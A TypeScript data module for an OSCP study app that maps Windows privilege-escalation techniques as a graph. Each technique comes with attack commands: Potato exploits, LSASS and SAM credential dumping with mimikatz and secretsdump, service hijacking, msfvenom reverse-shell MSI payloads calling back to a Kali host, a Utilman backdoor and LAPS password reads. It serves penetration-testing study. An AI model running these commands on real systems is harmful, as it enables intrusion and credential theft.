import type { OscpContent } from '@/types/oscp'

/** Phase: Windows privilege escalation. */
const windowsPrivesc: OscpContent = {
    nodes: [
        {
            id: 'privesc-enum-windows',
            title: 'Enumerate for privesc (Windows)',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                '`whoami /priv` and `whoami /groups` decide almost everything. Then winPEAS for services, autoruns, saved creds and installed software.',
            commands: [
                {
                    label: 'Token privileges + groups',
                    code: `whoami /priv
whoami /groups
# service perms, autoruns, AlwaysInstallElevated:
winPEASx64.exe`,
                },
                {
                    label: 'Manual service / autorun checks',
                    code: `sc query state= all
wmic service get name,pathname,startmode
accesschk.exe -accepteula -uwcqv <user> *
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`,
                },
                {
                    label: 'Patch / OS',
                    code: `systeminfo
wmic qfe get HotFixID,InstalledOn
hostname & whoami /all`,
                },
            ],
            tags: ['winpeas', 'whoami', 'priv', 'enumeration'],
        },
        {
            id: 'seimpersonate-potato',
            title: 'SeImpersonate -> Potato',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'SeImpersonatePrivilege (default for service accounts / IIS / MSSQL) lets you impersonate SYSTEM via a Potato. PrintSpoofer and GodPotato are the reliable OSCP picks; when you need a bind/redirect (e.g. firewall blocks 445), reach for RoguePotato or SigmaPotato.',
            commands: [
                {
                    label: 'PrintSpoofer / GodPotato',
                    code: `PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"`,
                },
                {
                    label: 'RoguePotato / SigmaPotato',
                    code: `RoguePotato.exe -r <kali-ip> -e "cmd /c whoami" -l 9999
SigmaPotato.exe --revshell <kali-ip> 443`,
                },
                {
                    label: 'Confirm the priv',
                    code: `whoami /priv | findstr /i impersonate
# IIS / MSSQL / service accounts have this by default`,
                },
            ],
            tags: ['seimpersonate', 'printspoofer', 'godpotato', 'potato', 'roguepotato', 'sigmapotato'],
        },
        {
            id: 'sedebug-lsass',
            title: 'SeDebug -> dump LSASS',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'SeDebugPrivilege lets you read LSASS memory and pull cached NTLM hashes / plaintext. Feed them straight into pass-the-hash or cracking. With Credential Guard enabled, LSASS holds no plaintext - dump the SAM or move to a host without it.',
            commands: [
                {
                    label: 'Dump + parse',
                    code: `# on target (or comsvcs.dll minidump):
rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass-pid> C:\\lsass.dmp full
# on Kali:
pypykatz lsa minidump lsass.dmp`,
                },
                {
                    label: 'procdump / mimikatz',
                    code: `procdump.exe -accepteula -ma lsass.exe lsass.dmp
# mimikatz:
privilege::debug
sekurlsa::logonpasswords`,
                },
            ],
            tags: ['sedebug', 'lsass', 'pypykatz', 'mimikatz', 'credential-guard'],
        },
        {
            id: 'service-hijack',
            title: 'Service misconfiguration',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Weak service binary permissions, an unquoted service path with a writable folder, or writable service registry keys all let you swap the binary and restart the service as SYSTEM.',
            commands: [
                {
                    label: 'Find + abuse',
                    code: `# writable service binary / unquoted path:
sc qc <service>
icacls "C:\\Path\\service.exe"
# replace binary, then:
sc stop <service> & sc start <service>`,
                },
                {
                    label: 'Unquoted path',
                    code: `wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows\\\\"
# if path is C:\\Program Files\\App\\service.exe and C:\\Program is writable:
# drop C:\\Program.exe, restart the service`,
                },
            ],
            tags: ['service', 'unquoted-path', 'binary-hijack', 'registry'],
        },
        {
            id: 'alwaysinstallelevated',
            title: 'AlwaysInstallElevated',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Both HKLM and HKCU AlwaysInstallElevated = 1 means any .msi runs as SYSTEM. Generate a malicious MSI and install it.',
            commands: [
                {
                    label: 'Check + exploit',
                    code: `reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=443 -f msi -o x.msi
msiexec /quiet /qn /i x.msi`,
                },
                {
                    label: 'msfvenom MSI',
                    code: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi`,
                },
            ],
            tags: ['alwaysinstallelevated', 'msi', 'msiexec'],
        },
        {
            id: 'cred-hunt-windows',
            title: 'Credential hunting (Windows)',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Unattend.xml, PowerShell history/transcripts, saved RDP/WiFi creds, cmdkey stores and the registry (Winlogon, PuTTY, VNC) leak passwords constantly.',
            commands: [
                {
                    label: 'Hunt',
                    code: `type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
findstr /si password *.xml *.ini *.txt *.config C:\\ 2>nul
cmdkey /list`,
                },
                {
                    label: 'Unattend / cmdkey / SAM backup',
                    code: `dir /s /b C:\\*unattend.xml C:\\*sysprep.xml C:\\*web.config 2>nul
cmdkey /list
reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
type C:\\Windows\\Panther\\Unattend.xml`,
                },
            ],
            tags: ['credentials', 'unattend', 'powershell-history', 'cmdkey'],
        },
        {
            id: 'kernel-exploit-windows',
            title: 'Kernel / missing patch',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Feed systeminfo to a suggester when no misconfig exists. Older targets fall to known LPEs.',
            commands: [
                {
                    label: 'Suggest',
                    code: `systeminfo > sysinfo.txt
# on Kali:
windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt`,
                },
                {
                    label: 'Watson / wesng',
                    code: `Watson.exe
# on Kali:
wes.py sysinfo.txt`,
                },
            ],
            tags: ['kernel', 'systeminfo', 'suggester', 'patch'],
        },
        {
            id: 'system-windows',
            title: 'SYSTEM / local admin',
            type: 'state',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Highest local privilege. Grab the flag, dump the SAM for local hashes, and - if the host is domain-joined - dump LSASS/mimikatz for domain creds to move laterally.',
            commands: [
                {
                    label: 'Dump local hashes',
                    code: `reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save
# on Kali:
impacket-secretsdump -sam sam.save -system system.save LOCAL`,
                },
                {
                    label: 'Proof + LSASS',
                    code: `whoami; hostname; type C:\\Users\\Administrator\\Desktop\\root.txt
# if domain-joined:
privilege::debug
sekurlsa::logonpasswords`,
                },
            ],
            tags: ['system', 'administrator', 'sam', 'secretsdump'],
        },
        {
            id: 'sebackup-ntsd',
            title: 'SeBackupPrivilege / ntsd',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'SeBackupPrivilege lets you copy SAM/SYSTEM (robocopy /b) and pull local hashes, or escalate to SYSTEM via the legacy ntsd.exe debugger trick when it is present.',
            commands: [
                {
                    label: 'Dump SAM/SYSTEM or ntsd -> SYSTEM',
                    code: `robocopy /b C:\\Windows\\System32\\config C:\\temp SAM SYSTEM
# legacy ntsd trick (if ntsd.exe exists):
ntsd -c "q" -pn lsass.exe
copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe`,
                },
                {
                    label: 'diskshadow + secretsdump',
                    code: `diskshadow /s script.txt     # expose SAM/SYSTEM/NTDS
impacket-secretsdump -sam sam.save -system system.save LOCAL`,
                },
            ],
            tags: ['sebackup', 'ntsd', 'robocopy', 'sam'],
        },
        {
            id: 'laps',
            title: 'LAPS readable',
            type: 'finding',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'Local Administrator Password Solution stores a unique local admin password in AD (ms-Mcs-AdmPwd). If your account can read that attribute, you get a plaintext local admin password for the host.',
            commands: [
                {
                    label: 'Read the LAPS password',
                    code: `netexec ldap <dc> -u <user> -p <pass> -M laps
ldapsearch -x -H ldap://<dc> -D '<user>' -w '<pass>' -b 'DC=corp,DC=com' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd`,
                },
                {
                    label: 'PowerView LAPS',
                    code: `Get-DomainComputer | Get-LAPSComputers
Get-AdmPwdPassword -ComputerName <host>`,
                },
            ],
            tags: ['laps', 'ms-mcs-admpwd', 'local-admin', 'netexec'],
        },
        {
            id: 'named-pipe-abuse',
            title: 'Named pipe impersonation',
            type: 'technique',
            phase: 'windows-privesc',
            os: 'windows',
            description:
                'A SYSTEM service that accepts client connections over a named pipe and calls ImpersonateNamedPipeClient can be made to run your payload. Find writable/accessible pipes, then use a pipe-named exploit or potato variant to force the service to impersonate you.',
            commands: [
                {
                    label: 'Find pipes + impersonate',
                    code: `accesschk.exe -accepteula -nobanner -w *
# any pipe your user can write to is a candidate;
# point a potato / pipe exploit at the target pipe name`,
                },
                {
                    label: 'List pipes',
                    code: `[System.IO.Directory]::GetFiles('\\\\.\\pipe\\')
# pipelist.exe from Sysinternals`,
                },
            ],
            tags: ['named-pipe', 'impersonation', 'accesschk', 'service'],
        },
    ],
    edges: [
        { from: 'privesc-enum-windows', to: 'seimpersonate-potato', label: 'SeImpersonate present' },
        { from: 'privesc-enum-windows', to: 'sedebug-lsass', label: 'SeDebug present' },
        { from: 'privesc-enum-windows', to: 'service-hijack', label: 'weak service / unquoted path' },
        { from: 'privesc-enum-windows', to: 'alwaysinstallelevated', label: 'AIE = 1' },
        { from: 'privesc-enum-windows', to: 'cred-hunt-windows', label: 'hunt saved creds' },
        { from: 'privesc-enum-windows', to: 'kernel-exploit-windows', label: 'no misconfig, old patch' },
        { from: 'seimpersonate-potato', to: 'system-windows', label: 'SYSTEM' },
        { from: 'sedebug-lsass', to: 'hash-to-crack', label: 'NTLM hashes' },
        { from: 'sedebug-lsass', to: 'creds-found', label: 'plaintext from LSASS' },
        { from: 'service-hijack', to: 'system-windows', label: 'service runs as SYSTEM' },
        { from: 'alwaysinstallelevated', to: 'system-windows', label: 'MSI as SYSTEM' },
        { from: 'cred-hunt-windows', to: 'creds-found', label: 'password recovered' },
        { from: 'kernel-exploit-windows', to: 'system-windows', label: 'LPE lands' },
        { from: 'system-windows', to: 'hash-to-crack', label: 'dump SAM' },
        { from: 'system-windows', to: 'ad-dump-creds', label: 'domain-joined -> dump domain creds' },
        { from: 'system-windows', to: 'ad-foothold', label: 'pivot into the domain' },
        { from: 'privesc-enum-windows', to: 'sebackup-ntsd', label: 'SeBackupPrivilege present' },
        { from: 'privesc-enum-windows', to: 'laps', label: 'LAPS readable via AD' },
        { from: 'privesc-enum-windows', to: 'named-pipe-abuse', label: 'writable/accessible pipe' },
        { from: 'sebackup-ntsd', to: 'hash-to-crack', label: 'dump SAM hashes' },
        { from: 'sebackup-ntsd', to: 'ad-dump-creds', label: 'domain-joined -> dump creds' },
        { from: 'laps', to: 'creds-found', label: 'plaintext local admin password' },
        { from: 'named-pipe-abuse', to: 'system-windows', label: 'impersonate SYSTEM' },
    ],
}

export default windowsPrivesc
